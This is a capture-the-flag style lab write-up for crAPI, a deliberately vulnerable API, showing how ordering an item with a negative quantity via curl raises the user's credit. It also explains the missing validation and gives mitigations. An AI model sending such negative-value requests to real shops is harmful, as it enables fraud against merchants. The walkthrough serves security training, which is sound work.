# Challenge 8 — Mass Assignment: Get an item for free

**OWASP API Top 10 mapping:** API6:2023 Unrestricted Business Flows / API8:2023 Security Misconfiguration  
**crAPI category:** Mass Assignment

## Goal

Order an item from the shop without paying for it — or even have the store pay the user.

## Vulnerability

The order creation endpoint subtracts `product.price * quantity` from the user's available credit, but it never validates that `quantity` is positive. Sending a negative quantity turns the subtraction into a credit addition and still creates an order record.

## Exploit steps

### 1. Authenticate and check the product list

```bash
JWT="<your-jwt>"

curl -s -H "Authorization: Bearer $JWT" \
  'http://127.0.0.1:8888/workshop/api/shop/products?offset=0&limit=10' | python3 -m json.tool
```

Example product:

```json
{
  "id": 1,
  "name": "Seat",
  "price": "10.00",
  "image_url": "images/seat.svg"
}
```

### 2. Place an order with a negative quantity

```bash
curl -s -X POST \
  -H "Authorization: Bearer $JWT" \
  -H "Content-Type: application/json" \
  http://127.0.0.1:8888/workshop/api/shop/orders \
  -d '{"product_id": 1, "quantity": -1}' | python3 -m json.tool
```

### 3. Observe the result

```json
{
  "id": 7,
  "message": "Order sent successfully.",
  "credit": 110.0
}
```

The user's balance **increased** by `$10.00`, yet an order was created. The item was effectively free and the user was paid for "ordering" it.

## Why this works

- `OrderControlView.post` accepts `quantity` directly from the request body.
- It subtracts `float(product.price * quantity)` without checking the sign.
- `ProductQuantitySerializer` only enforces that `quantity` is an integer, not that it is positive.

## Impact

- Attacker can create unlimited orders while continuously increasing their balance.
- Financial totals, inventory, and transaction logs become unreliable.
- The same missing validation can be scaled to move arbitrary amounts of money.

## Mitigation

- Validate business-critical inputs on the server side: `quantity` must be a positive integer within acceptable limits.
- Use strong typing and constraints in serializers (e.g., `MinValueValidator(1)`).
- Never let raw user input drive arithmetic that affects balances or prices.
- Keep the order total calculation server-side and recompute it from trusted data, not from client-supplied values alone.
